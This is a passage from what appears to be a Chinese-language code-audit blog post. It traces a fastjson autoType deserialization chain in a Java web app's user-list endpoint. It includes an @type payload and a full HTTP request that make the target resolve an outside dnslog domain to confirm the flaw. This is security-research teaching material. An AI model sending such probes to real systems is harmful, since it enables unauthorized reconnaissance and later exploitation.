+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">defaultClassLoader</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">binarySearch</span><span class="p">(</span><span class="n">denyHashCodes</span><span class="p">,</span><span class="w"> </span><span class="n">hash</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getClassFromMapping</span><span class="p">(</span><span class="n">typeName</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s">&#34;autoType is not support. &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 TypeUtils.loadClass</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">loadClass</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">classLoader</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">cache</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">className</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">className</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">className</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">128</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>下一步执行序列化和反序列化</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ObjectDeserializer</span><span class="w"> </span><span class="n">deserializer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getDeserializers</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">clazz</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">deserializer</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">T</span><span class="p">)</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">clazz</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><!-- raw HTML omitted -->在执行反序列化的过程中，调用实例化的类，执行后续命令<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p>接下来应该找<strong>调用 StringUtil#getInfo 方法</strong>的地方</p>
+<p>看了参考文章找到 <!-- raw HTML omitted -->UserComponent<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">getUserList</span><span class="p">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//接收到前端传的 Map&lt;String,String&gt;，包含 search </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Constants</span><span class="p">.</span><span class="na">SEARCH</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">userName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StringUtil</span><span class="p">.</span><span class="na">getInfo</span><span class="p">(</span><span class="n">search</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;userName&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">loginName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StringUtil</span><span class="p">.</span><span class="na">getInfo</span><span class="p">(</span><span class="n">search</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;loginName&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">order</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">QueryUtils</span><span class="p">.</span><span class="na">order</span><span class="p">(</span><span class="n">map</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">QueryUtils</span><span class="p">.</span><span class="na">filter</span><span class="p">(</span><span class="n">map</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">userService</span><span class="p">.</span><span class="na">select</span><span class="p">(</span><span class="n">userName</span><span class="p">,</span><span class="w"> </span><span class="n">loginName</span><span class="p">,</span><span class="w"> </span><span class="n">QueryUtils</span><span class="p">.</span><span class="na">offset</span><span class="p">(</span><span class="n">map</span><span class="p">),</span><span class="w"> </span><span class="n">QueryUtils</span><span class="p">.</span><span class="na">rows</span><span class="p">(</span><span class="n">map</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>找 getUserList 的调用地方，这时应该找的是控制器里的方法了</p>
+<blockquote>
+<p>几个踩坑的地方：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png"></p>
+<p>我们要注意，真正应该调用的是 <!-- raw HTML omitted -->getUserList(Map&lt;String, String&gt; map)，而上面的都不是正确调用<!-- raw HTML omitted --></p>
+</blockquote>
+<p>找到真正调用 <!-- raw HTML omitted -->getUserList(Map&lt;String, String&gt; map) 的地方<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//路径变量 {apiName} </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nd">@GetMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/{apiName}/list&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getList</span><span class="p">(</span><span class="nd">@PathVariable</span><span class="p">(</span><span class="s">&#34;apiName&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">apiName</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">PAGE_SIZE</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">pageSize</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">CURRENT_PAGE</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">currentPage</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="c1">//search 可传入 payload</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">SEARCH</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">search</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//参数全部放入 Map，进行后续处理</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">parameterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ParamUtils</span><span class="p">.</span><span class="na">requestToMap</span><span class="p">(</span><span class="n">request</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">parameterMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Constants</span><span class="p">.</span><span class="na">SEARCH</span><span class="p">,</span><span class="w"> </span><span class="n">search</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">PageQueryInfo</span><span class="w"> </span><span class="n">queryInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PageQueryInfo</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">objectMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="p">();</span><span class="w">
+</span></span></span></code></pre></div><hr>
+<p><strong>小结利用链：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@GetMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/{apiName}/list&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getList</span><span class="p">(</span><span class="nd">@PathVariable</span><span class="p">(</span><span class="s">&#34;apiName&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">apiName</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">PAGE_SIZE</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">pageSize</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">CURRENT_PAGE</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">currentPage</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">SEARCH</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">search</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">getUserList</span><span class="p">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">userName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StringUtil</span><span class="p">.</span><span class="na">getInfo</span><span class="p">(</span><span class="n">search</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;userName&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">loginName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StringUtil</span><span class="p">.</span><span class="na">getInfo</span><span class="p">(</span><span class="n">search</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;loginName&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getInfo</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">search</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">userName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StringUtil</span><span class="p">.</span><span class="na">getInfo</span><span class="p">(</span><span class="n">search</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;userName&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">loginName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StringUtil</span><span class="p">.</span><span class="na">getInfo</span><span class="p">(</span><span class="n">search</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;loginName&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSONObject</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">search</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parse</span><span class="p">(</span><span class="n">text</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">turn</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="n">DEFAULT_PARSER_FEATURE</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="n">parse</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">(),</span><span class="w"> </span><span class="n">features</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">DefaultJSONParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DefaultJSONParser</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="n">config</span><span class="p">,</span><span class="w"> </span><span class="n">features</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">parse</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">parse</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="n">parseObject</span><span class="p">(</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">fieldName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">parseObject</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">fieldName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">checkAutoType</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">lexer</span><span class="p">.</span><span class="na">getFeatures</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">checkAutoType</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">expectClass</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">features</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">defaultClassLoader</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">loadClass</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">classLoader</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">cache</span><span class="p">)</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">ObjectDeserializer</span><span class="w"> </span><span class="n">deserializer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getDeserializers</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">clazz</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><h4 id="payload">payload<a hidden class="anchor" aria-hidden="true" href="#payload">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;java.net.Inet4Address&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;val&#34;</span><span class="p">:</span><span class="s2">&#34;xxx.dnslog.cn&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>@type：指定 fastjson 要实例化的类， val：这个类的某个字段值</p>
+<p><code>Inet4Address</code> 只能解析 IP/域名，不能触发 LDAP 请求</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">user/list?search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ccne35.dnslog.cn%22%7D</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">172.28.192.1:8123</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png"></p>
+<h4 id="断点调试">断点调试：<a hidden class="anchor" aria-hidden="true" href="#断点调试">#</a></h4>
+<p>调试过程基本和“分析链”中一致，</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png"></p>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<blockquote>
+<p><!-- raw HTML omitted -->通过dnslog探测fastjson的几种方法（<!-- raw HTML omitted -->java.net.Inet4Address、Inet6Address、InetSocketAddress，url）</p>
+<p><a href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p>
+</blockquote>
+<h4 id="总结">总结：<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h4>
